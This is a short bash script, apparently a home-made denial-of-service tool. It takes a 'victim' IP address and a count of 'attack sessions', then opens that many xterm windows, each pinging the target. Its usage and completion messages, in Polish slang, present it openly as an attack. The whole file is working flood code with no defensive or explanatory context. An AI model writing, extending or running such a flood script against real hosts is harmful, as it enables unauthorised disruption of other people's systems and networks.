#!/bin/bash
if [[ ( $1 == "" ) || ( $2 == "" ) ]]; then
        echo "Pukam do : $0 IP_Addess_of_Victim Num_OfAttack_Session"
        exit
else
        for (( i=1; i<=$2; i++ )); do
              xterm -e ping $1 &
        done
fi
echo "Pukano do [$1] with$2 :)"
